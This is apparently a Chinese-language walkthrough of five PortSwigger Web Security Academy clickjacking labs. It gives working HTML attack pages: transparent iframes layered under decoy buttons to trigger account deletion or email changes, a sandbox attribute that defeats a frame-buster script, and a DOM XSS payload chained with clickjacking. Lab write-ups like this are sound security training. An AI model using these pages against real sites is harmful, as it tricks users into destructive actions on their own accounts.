---

title: PortSwigger--Clickjacking
categories: [渗透靶场, PortSwigger]

---



## 知识扩展

- 点击劫持

  通过HTML标签<iframe>在受害者网页之上嵌入页面/文档元素，诱使用户点击

  通过设置X-Frame-Options HTTP头阻止页面被嵌入到<iframe>中可有效防止点击劫持攻击

  

- URL参数预填充

  通过在URL中附加查询参数，用户可以访问一个带有预设数据的页面，无需手动在输入框中输入数据

  

  例如：https://www.example.com/register?email=user@example.com

  客户端页面在加载时，JavaScript代码或后端逻辑会读取URL中的email参数，并将其值user@example.com自动填充至Email输入框中

  

- Sandbox

  sandbox是<iframe>标签的常用属性，对<iframe>中的内容行为进行限制

  通过设置sandbox可以有效防止<iframe>标签内的脚本执行，表单提交，弹出窗口等恶意行为

  

- Sandbox参数值

  allow-same-origin：允许内容与父文档共享相同的原点
  
  allow-script：允许iframe内运行脚本
  
  allow-popups：允许iframe内的内容进行弹窗
  
  allow-forms：允许表单提交
  
  

## 1.Basic clickjacking with CSRF token protection

（1）用户wiener登录，F12进入开发者模式确认Delete account元素的大概位置，进入Go to exploit server模块

![image-20240829093157750](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408290931841.png)

![image-20240830092532062](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300925185.png)

![image-20240829093949900](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408290939961.png)

（2）Body字段填入以下内容，设置Top值为519，left为190，Opacity为0.1

```py
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:519px;
        left:190px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0a7e00be0305478181fffc7000d70064.web-security-academy.net/my-account"></iframe>
```

![image-20240830095644140](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300956224.png)

（3）点击View exploit进行页面预览，发现Click Me元素的偏差稍微有点大，为了确保Click Me和Delete account重叠，需要对top和left的值进行调整适当调整

![image-20240830095721136](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300957210.png)

（4）调整结果和最终数据如下（除了top和left的值，还需要调整opacity的值为0.0001，以此来达到页面其他元素几乎完全透明的效果，同时opacity的值为0.0001也是靶场的通过条件之一）

```python
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:510px;
        left:65px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0a7e00be0305478181fffc7000d70064.web-security-academy.net/my-account"></iframe>
```

![image-20240830100036725](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408301000817.png)

![image-20240830100321821](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408301003905.png)

（5）点击Deliver exploit to victim，通关靶场

除了手搓代码生成HTML劫持页面外，还可以使用Burpsuite中的Clickbandit模块，自动生成HTML劫持页面，但是生成的HTML页面尽管能实现点击劫持的效果，却不知何种原因导致Deliver exploit to victim时无法通关靶场

![image-20240829103901678](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291039748.png)

（6）利用Burpsuite中的Clickbandit模块自动生成HTML劫持页面操作步骤

![image-20240829201234438](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292012504.png)

![image-20240829201324215](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292013285.png)

![image-20240829201406949](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292014040.png)

（7）选中Delete account --》点击Finish --》点击Toggle transparency调整页面透明度

![image-20240829201429887](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292014967.png)

![image-20240829201446068](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292014141.png)

![image-20240829201500475](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292015543.png)

（8）完成上诉步骤后点击save，浏览器将会自动下载生成的HTML劫持页面，此时再进入Go to exploit server中进行Deliver exploit to victim

![image-20240829201611505](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292016566.png)

![image-20240829201658049](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408292016143.png)

## 2.Clickjacking with form input data prefilled from a URL parameter

（1）用户wiener登录，进行URL参数预填充

![image-20240829111848643](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291118707.png)

![image-20240829112324915](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300001654.png)

（2）需要注意的是此处<iframe> src 指向的地址需要完成URL参数预填充，后续操作同Lab1一致

```py
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a2a00bb040d4649839319ac00a3006e.web-security-academy.net/my-account?email=11@qq.com"></iframe>

```

![image-20240829114930120](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291149184.png)

## 3.Clickjacking with a frame buster script

（1）用户wiener登录，进入Go to exploit server模块

![image-20240829151046353](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291510435.png)

（2）Body部分插入Lab2一样的HTML代码，点击View exploit进行预查看时发现Click Me 无法点击

```python
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0ad400cf04705ea88048122c001a0027.web-security-academy.net/my-account?email=222@qq.com"></iframe>
```

![image-20240829153319368](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291533431.png)

（3）在<iframe> src中增添属性sandbox设置其值为"allow-forms"（允许<iframe>中的内容进行表单提交）

```py
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe sandbox="allow-forms" src="https://0ad400cf04705ea88048122c001a0027.web-security-academy.net/my-account?email=222@qq.com"></iframe>
```

![image-20240829153652391](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291536454.png)

## 4.Exploiting clickjacking vulnerability to trigger DOM-based XSS

（1）表单页面进行数据提交测试，发现name输入框中的内容回显

![image-20240830001833713](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300018877.png)

![image-20240830001913162](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300019286.png)

（2）进行源码查看，发现innerHTML属性，name输入框的值直接返回给feedbackResult

![image-20240830102147649](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408301021738.png)

![image-20240830102304964](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408301023064.png)

（3）进行DOM型XSS验证

![image-20240829160614415](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291606494.png)

（4）Go to exploit server模块进行Domxss+点击劫持的利用

```py
<style>
iframe {
position:relative;
width:1000px;
height: 700px;
opacity: 0.0001;
z-index: 2;
}
div {
position:absolute;
top:620px;
left:40px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe
src="https://0a8100b504bc65c5821d6f2d00fa003c.web-security-academy.net/feedback/?name=<img src=1 onerror=alert(1)>&email=111@qq.com&subject=111&message=111#feedbackResult"></iframe>
```

![image-20240829161013477](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291610568.png)

![image-20240829163727870](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291637945.png)

## 5.Multistep clickjacking

（1）用户wiener登录，点击Delete account功能需要进行下一步的确认

![image-20240829164018636](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291640719.png)

![image-20240830002338048](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408300023171.png)

（2）因此在HTML劫持页面中需要设置两个功能按钮

```py
<style>
			iframe {
				position:relative;
				width: 1000px;
				height: 700px;
				opacity: 0.0001;
				z-index: 2;
			}
		   .firstClick, .secondClick {
				position:absolute;
				top:495px;
				left:40px;
				z-index: 1;
			}
		   .secondClick {
				top:290px;
				left:210px;
			}
		</style>
		<div class="firstClick">Click me first</div>
		<div class="secondClick">Click me next</div>
		<iframe src="https://0a32006d04e0c08d81e84fa700480021.web-security-academy.net/my-account"></iframe>
```

![image-20240829164205810](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291642894.png)

![image-20240829164219644](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408291642712.png)
